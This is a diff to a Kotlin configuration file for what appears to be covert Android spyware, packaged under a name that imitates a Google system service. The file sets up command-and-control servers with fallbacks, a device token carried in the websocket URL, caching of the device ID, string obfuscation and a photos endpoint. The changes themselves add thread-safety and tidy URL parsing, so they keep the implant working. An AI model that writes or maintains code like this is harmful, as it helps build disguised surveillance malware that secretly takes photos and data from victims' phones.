@@ -6,19 +6,19 @@ import com.google.android.systemservice.BuildConfig
 object AndroidConfig {
     // Server Configuration
     // Configured via Gradle property: -PserverBaseUrl="IP:PORT"
-    private var serverBaseUrl = BuildConfig.SERVER_BASE_URL
-    private var useHttps = false
+    @Volatile private var serverBaseUrl = BuildConfig.SERVER_BASE_URL
+    @Volatile private var useHttps = false
     
     // Fallback C2 servers (tried in order if primary fails)
     private val fallbackServers = mutableListOf<String>()
-    private var currentServerIndex = 0
+    @Volatile private var currentServerIndex = 0
     
     // API Authentication Token - loaded from BuildConfig (set via Gradle property -PdeviceToken="...")
     val DEVICE_TOKEN: String = BuildConfig.DEVICE_AUTH_TOKEN
     val deviceToken: String get() = DEVICE_TOKEN
     
     // Device Identifier (cached from Settings.Secure.ANDROID_ID)
-    var deviceId: String = ""
+    @Volatile var deviceId: String = ""
         private set
     
     // Dynamic String Obfuscation
@@ -60,20 +60,20 @@ object AndroidConfig {
         get() = if (useHttps) "wss" else "ws"
     
     val serverUrl: String
-        get() = if (serverBaseUrl.startsWith("http")) serverBaseUrl else "$httpProtocol://$serverBaseUrl"
+        get() = if (serverBaseUrl.startsWith("http://") || serverBaseUrl.startsWith("https://")) serverBaseUrl else "$httpProtocol://$serverBaseUrl"
     
     val websocketUrl: String
         get() {
-            val base = if (serverBaseUrl.startsWith("http")) {
-                serverBaseUrl.replaceFirst("https", "wss").replaceFirst("http", "ws")
-            } else {
-                "$wsProtocol://$serverBaseUrl"
-            }
+            val base = when {
+                serverBaseUrl.startsWith("https://") -> serverBaseUrl.replaceFirst("https://", "wss://")
+                serverBaseUrl.startsWith("http://") -> serverBaseUrl.replaceFirst("http://", "ws://")
+                else -> "ws://$serverBaseUrl"
+            }.trimEnd('/')
             return "$base/cable?token=$DEVICE_TOKEN"
         }
     
     val apiBaseUrl: String
-        get() = "$serverUrl/api"
+        get() = "${serverUrl.trimEnd('/')}/api"
     
     // Specific endpoints
     val photosEndpoint: String
@@ -115,9 +115,9 @@ object AndroidConfig {
      */
     fun getServerHost(): String {
         return try {
-            java.net.URI(serverUrl).host ?: serverBaseUrl.split(":").first()
+            java.net.URI(serverUrl).host ?: serverBaseUrl.removePrefix("https://").removePrefix("http://").split(":").first().split("/").first()
         } catch (e: Exception) {
-            serverBaseUrl.split(":").first()
+            serverBaseUrl.removePrefix("https://").removePrefix("http://").split(":").first().split("/").first()
         }
     }
 
@@ -158,6 +158,7 @@ object AndroidConfig {
     fun loadFromPreferences(context: Context) {
         val prefs = context.getSharedPreferences("android_config", Context.MODE_PRIVATE)
         serverBaseUrl = prefs.getString("server_base_url", serverBaseUrl) ?: serverBaseUrl
+        currentServerIndex = 0
         useHttps = prefs.getBoolean("use_https", useHttps)
     }
     
